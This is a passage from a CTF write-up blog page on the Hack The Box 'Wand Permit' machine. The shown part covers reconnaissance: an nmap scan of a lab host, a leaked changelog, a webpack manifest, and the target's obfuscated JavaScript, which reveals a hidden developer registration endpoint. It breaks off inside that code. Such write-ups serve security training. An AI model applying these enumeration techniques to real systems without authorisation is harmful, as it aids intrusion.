<!doctype html><html lang=en><head><title>Wand Permit :: Soviet's CTF Write-UPs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Boot2Root machine containg RCE via SSTI, signing secret bruteforce, docker escapes, explosions and all fun stuff"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/ctf/htb-university-ctf-2022/fullpwn/wand-permit/><link rel=stylesheet href=/style.css><link rel=stylesheet href=/scss/attach.css><link rel="shortcut icon" href=/img/theme-colors/red.png><link rel=apple-touch-icon href=/img/theme-colors/red.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Wand Permit"><meta property="og:description" content="Boot2Root machine containg RCE via SSTI, signing secret bruteforce, docker escapes, explosions and all fun stuff"><meta property="og:url" content="/ctf/htb-university-ctf-2022/fullpwn/wand-permit/"><meta property="og:site_name" content="Soviet's CTF Write-UPs"><meta property="og:image" content="/img/favicon/red.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-12-03 19:25:08 +0100 +0100"></head><body class=red><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>SovietBeast</div></a></div></div></header><div class=content><article class=post><h1 class=post-title><a href=/ctf/htb-university-ctf-2022/fullpwn/wand-permit/>Wand Permit</a></h1><div class=post-meta><time class=post-date>2022-12-03 ::</time></div><div class=post-content><div><h1 id=wand-permit>Wand Permit<a href=#wand-permit class=hanchor arialabel=Anchor>&#8983;</a></h1><blockquote><p>You are a big boy magician now, it&rsquo;s time to get your magic wand permit but the wand permit service has closed registration for some weird reason. Can you find a way to get your permit?</p></blockquote><h1 id=information-gathering>Information Gathering<a href=#information-gathering class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=nmap-scan>Nmap Scan<a href=#nmap-scan class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Nmap scan returned only two ports open, one being <code>http</code> and second <code>postgres</code> database.
Web server has <code>robots.txt</code> file with one disallowed entry <code>/static/CHANGELOG.txt</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.93 scan initiated Sat Dec  3 09:48:56 2022 as: nmap -p80,5432 -sC -sV -A -oA wand_permit 10.129.251.44</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.129.251.44
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.037s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE    VERSION
</span></span><span style=display:flex><span>80/tcp   open  http       Werkzeug/2.2.2 Python/3.8.10
</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#ae81ff>1</span> disallowed entry 
</span></span><span style=display:flex><span>|_/static/CHANGELOG.txt
</span></span><span style=display:flex><span>| http-title: Wand Permit Authority | Log-in
</span></span><span style=display:flex><span>|_Requested resource was login
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   FourOhFourRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>404</span> NOT FOUND
</span></span><span style=display:flex><span>|     Server: Werkzeug/2.2.2 Python/3.8.10
</span></span><span style=display:flex><span>|     Date: Sat, <span style=color:#ae81ff>03</span> Dec <span style=color:#ae81ff>2022</span> 08:49:13 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>207</span>
</span></span><span style=display:flex><span>|     Server: is online :<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|     X-Powered-By: Magic
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
</span></span><span style=display:flex><span>|     &lt;html lang<span style=color:#f92672>=</span>en&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>302</span> FOUND
</span></span><span style=display:flex><span>|     Server: Werkzeug/2.2.2 Python/3.8.10
</span></span><span style=display:flex><span>|     Date: Sat, <span style=color:#ae81ff>03</span> Dec <span style=color:#ae81ff>2022</span> 08:49:08 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>197</span>
</span></span><span style=display:flex><span>|     Location: login
</span></span><span style=display:flex><span>|     Server: is online :<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|     X-Powered-By: Magic
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!doctype html&gt;
</span></span><span style=display:flex><span>|     &lt;html lang<span style=color:#f92672>=</span>en&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;login&#34;</span>&gt;login&lt;/a&gt;. If not, click the link.
</span></span><span style=display:flex><span>|   HTTPOptions: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>|     Server: Werkzeug/2.2.2 Python/3.8.10
</span></span><span style=display:flex><span>|     Date: Sat, <span style=color:#ae81ff>03</span> Dec <span style=color:#ae81ff>2022</span> 08:49:08 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>|     Allow: OPTIONS, GET, HEAD
</span></span><span style=display:flex><span>|     Server: is online :<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|     X-Powered-By: Magic
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|   RTSPRequest: 
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#e6db74>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
</span></span><span style=display:flex><span>|     <span style=color:#e6db74>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta http-equiv<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Content-Type&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html;charset=utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request version <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;RTSP/1.0&#39;</span><span style=color:#f92672>)</span>.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;/body&gt;
</span></span><span style=display:flex><span>|_    &lt;/html&gt;
</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
</span></span><span style=display:flex><span>5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   SMBProgNeg: 
</span></span><span style=display:flex><span>|     SFATAL
</span></span><span style=display:flex><span>|     VFATAL
</span></span><span style=display:flex><span>|     C0A000
</span></span><span style=display:flex><span>|     Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0
</span></span><span style=display:flex><span>|     Fpostmaster.c
</span></span><span style=display:flex><span>|     L2188
</span></span><span style=display:flex><span>|_    RProcessStartupPacket
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 4.15 - 5.6 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.1 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 5.3 - 5.4 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, AXIS 210A or <span style=color:#ae81ff>211</span> Network Camera <span style=color:#f92672>(</span>Linux 2.6.17<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 5.0 - 5.3 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 5.4 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 443/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   36.93 ms 10.10.14.1
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   38.12 ms 10.129.251.44
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Sat Dec  3 09:50:32 2022 -- 1 IP address (1 host up) scanned in 96.02 seconds</span>
</span></span></code></pre></div><h2 id=enumearation>Enumearation<a href=#enumearation class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=webserver>WebServer<a href=#webserver class=hanchor arialabel=Anchor>&#8983;</a></h3><h4 id=robotstxt>robots.txt<a href=#robotstxt class=hanchor arialabel=Anchor>&#8983;</a></h4><p><img src=images/0.png alt=untitled></p><pre tabindex=0><code>User-agent: * 
Disallow: /static/CHANGELOG.txt
</code></pre><h4 id=changelogtxt>CHANGELOG.txt<a href=#changelogtxt class=hanchor arialabel=Anchor>&#8983;</a></h4><p>Changelog leaked two things:</p><ul><li>there could be some hardcoded secrets in application files as stated in <code>Version 2.4.0</code></li><li>added manifest plugin
<img src=images/1.png alt=untitled></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Version 2.4.0
</span></span><span style=display:flex><span>-------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Removed hardcoded secrets on core.js, might need more cleaning on other files
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 2.3.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Added manifest plugin to webpack for an upcoming feature
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 2.2.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Cleaned up unused files
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 2.1.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Temporarily disabled registrations to normal users due to issues again
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 2.0.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Added special feature that allows only developers to access certain features
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 1.3.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Added webpack for static file bundling
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 1.2.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Added base45 encoding support for the new Wizard ID&#39;s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 1.1.0
</span></span><span style=display:flex><span>------------------------
</span></span><span style=display:flex><span><span style=color:#66d9ef>-</span> Fixed issues on registration
</span></span></code></pre></div><h4 id=manifestjson>manifest.json<a href=#manifestjson class=hanchor arialabel=Anchor>&#8983;</a></h4><p>After quick google <code>manifest plugin webpack</code> this <a href=https://www.npmjs.com/package/webpack-manifest-plugin>link</a> appeared as first. Based on that manifest file propably is called <code>manifest.json</code> and it is located in <code>static</code> direcotry. Full path <code>/static/manifest.json</code></p><p>Reading this file revealed another <code>javascript</code> files.</p><ul><li>minicssextract.css</li><li>main-bundle.js</li><li>dev-48644bcc829deeffe29e-bundle.js
<img src=imatges/22.png alt=untitled></li></ul><p>Content of <code>main-bundle.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>(()=&gt;{<span style=color:#e6db74>&#34;use strict&#34;</span>;<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>t</span>(<span style=color:#a6e22e>e</span>,<span style=color:#a6e22e>r</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>s</span><span style=color:#f92672>=</span><span style=color:#a6e22e>n</span>();<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>t</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>s</span>[<span style=color:#a6e22e>t</span><span style=color:#f92672>-=</span><span style=color:#ae81ff>271</span>]})(<span style=color:#a6e22e>e</span>,<span style=color:#a6e22e>r</span>)}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>n</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;88nTNxbi&#34;</span>,<span style=color:#e6db74>&#34;674502feENOW&#34;</span>,<span style=color:#e6db74>&#34;2032023SNqBbM&#34;</span>,<span style=color:#e6db74>&#34;22BoFNoI&#34;</span>,<span style=color:#e6db74>&#34;submit&#34;</span>,<span style=color:#e6db74>&#34;520682ZYoYwM&#34;</span>,<span style=color:#e6db74>&#34;8NCvxNF&#34;</span>,<span style=color:#e6db74>&#34;351036juKBfo&#34;</span>,<span style=color:#e6db74>&#34;607930DIkrQc&#34;</span>,<span style=color:#e6db74>&#34;2UFTray&#34;</span>,<span style=color:#e6db74>&#34;1335948eXCNaG&#34;</span>,<span style=color:#e6db74>&#34;loginForm&#34;</span>,<span style=color:#e6db74>&#34;/login&#34;</span>,<span style=color:#e6db74>&#34;1304295IBrEeG&#34;</span>];<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>n</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>t</span>})()}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>e</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>n</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>e</span><span style=color:#f92672>=</span>document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#a6e22e>n</span>(<span style=color:#ae81ff>274</span>));<span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#a6e22e>n</span>(<span style=color:#ae81ff>275</span>),<span style=color:#a6e22e>e</span>[<span style=color:#a6e22e>n</span>(<span style=color:#ae81ff>281</span>)]()}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>r</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;registerForm&#34;</span>,<span style=color:#e6db74>&#34;6634359pNVFml&#34;</span>,<span style=color:#e6db74>&#34;method&#34;</span>,<span style=color:#e6db74>&#34;action&#34;</span>,<span style=color:#e6db74>&#34;1UzWrqh&#34;</span>,<span style=color:#e6db74>&#34;4251786JMOHtu&#34;</span>,<span style=color:#e6db74>&#34;/testing/dev/api/v3/register&#34;</span>,<span style=color:#e6db74>&#34;3379708uVuUSP&#34;</span>,<span style=color:#e6db74>&#34;3eifQCL&#34;</span>,<span style=color:#e6db74>&#34;POST&#34;</span>,<span style=color:#e6db74>&#34;7797979AOoKKf&#34;</span>,<span style=color:#e6db74>&#34;5986304ePFOpi&#34;</span>,<span style=color:#e6db74>&#34;336692zuUMXy&#34;</span>,<span style=color:#e6db74>&#34;submit&#34;</span>,<span style=color:#e6db74>&#34;3688955HtwrSn&#34;</span>];<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>t</span>})()}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>s</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>r</span>();<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>s</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>e</span>[<span style=color:#a6e22e>t</span><span style=color:#f92672>-=</span><span style=color:#ae81ff>199</span>]})(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>)}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>o</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span><span style=color:#a6e22e>s</span>,<span style=color:#a6e22e>n</span><span style=color:#f92672>=</span>document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>212</span>));<span style=color:#a6e22e>n</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>200</span>)]<span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>203</span>),<span style=color:#a6e22e>n</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>199</span>)]<span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>206</span>),<span style=color:#a6e22e>n</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>210</span>)]()}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>u</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>c</span>();<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>u</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>e</span>[<span style=color:#a6e22e>t</span><span style=color:#f92672>-=</span><span style=color:#ae81ff>194</span>]})(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>)}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>c</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;67370NVaJae&#34;</span>,<span style=color:#e6db74>&#34;176Euyxzh&#34;</span>,<span style=color:#e6db74>&#34;263842eCWWIF&#34;</span>,<span style=color:#e6db74>&#34;48zypDZa&#34;</span>,<span style=color:#e6db74>&#34;3946476BBFrMR&#34;</span>,<span style=color:#e6db74>&#34;1017fiVBvr&#34;</span>,<span style=color:#e6db74>&#34;395236JAWcZI&#34;</span>,<span style=color:#e6db74>&#34;149765hIJPRp&#34;</span>,<span style=color:#e6db74>&#34;143erIBdq&#34;</span>,<span style=color:#e6db74>&#34;790092xcFjJE&#34;</span>,<span style=color:#e6db74>&#34;10655Jtljli&#34;</span>,<span style=color:#e6db74>&#34;3OkZlct&#34;</span>];<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>c</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>t</span>})()}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>a</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;249907cJcLKv&#34;</span>,<span style=color:#e6db74>&#34;443991yBytqs&#34;</span>,<span style=color:#e6db74>&#34;keyup&#34;</span>,<span style=color:#e6db74>&#34;18638217IUPyOL&#34;</span>,<span style=color:#e6db74>&#34;6gRcFCw&#34;</span>,<span style=color:#e6db74>&#34;addEventListener&#34;</span>,<span style=color:#e6db74>&#34;emailInput&#34;</span>,<span style=color:#e6db74>&#34;name&#34;</span>,<span style=color:#e6db74>&#34;1169515suZGLZ&#34;</span>,<span style=color:#e6db74>&#34;24KlCwin&#34;</span>,<span style=color:#e6db74>&#34;440075AUCbti&#34;</span>,<span style=color:#e6db74>&#34;value&#34;</span>,<span style=color:#e6db74>&#34;change&#34;</span>,<span style=color:#e6db74>&#34;2091622XzcfjD&#34;</span>,<span style=color:#e6db74>&#34;onload&#34;</span>,<span style=color:#e6db74>&#34;innerHTML&#34;</span>,<span style=color:#e6db74>&#34;Login&#34;</span>,<span style=color:#e6db74>&#34;click&#34;</span>,<span style=color:#e6db74>&#34;disabled&#34;</span>,<span style=color:#e6db74>&#34;files&#34;</span>,<span style=color:#e6db74>&#34;fileUploadInput&#34;</span>,<span style=color:#e6db74>&#34;7387264hDtVhe&#34;</span>,<span style=color:#e6db74>&#34;getElementById&#34;</span>];<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>a</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>t</span>})()}<span style=color:#f92672>!</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>n</span>,<span style=color:#a6e22e>e</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>s</span><span style=color:#f92672>=</span><span style=color:#a6e22e>n</span>();<span style=color:#66d9ef>for</span>(;;)<span style=color:#66d9ef>try</span>{<span style=color:#66d9ef>if</span>(<span style=color:#ae81ff>369556</span><span style=color:#f92672>==</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>282</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>1</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>272</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>278</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>3</span><span style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>283</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>4</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>276</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>5</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>273</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>6</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>279</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>7</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>277</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>284</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>271</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>10</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>280</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>11</span>))<span style=color:#66d9ef>break</span>;<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>shift</span>())}<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>t</span>){<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>shift</span>())}}(<span style=color:#a6e22e>n</span>),<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>s</span>,<span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>();<span style=color:#66d9ef>for</span>(;;)<span style=color:#66d9ef>try</span>{<span style=color:#66d9ef>if</span>(<span style=color:#ae81ff>669711</span><span style=color:#f92672>==</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>201</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>1</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>209</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>205</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>3</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>204</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>4</span>)<span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>211</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>5</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>202</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>6</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>207</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>7</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>208</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>213</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span>)<span style=color:#66d9ef>break</span>;<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>shift</span>())}<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>t</span>){<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>shift</span>())}}(<span style=color:#a6e22e>r</span>),<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>u</span>,<span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>();<span style=color:#66d9ef>for</span>(;;)<span style=color:#66d9ef>try</span>{<span style=color:#66d9ef>if</span>(<span style=color:#ae81ff>504549</span><span style=color:#f92672>==</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>201</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>1</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>205</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>2</span><span 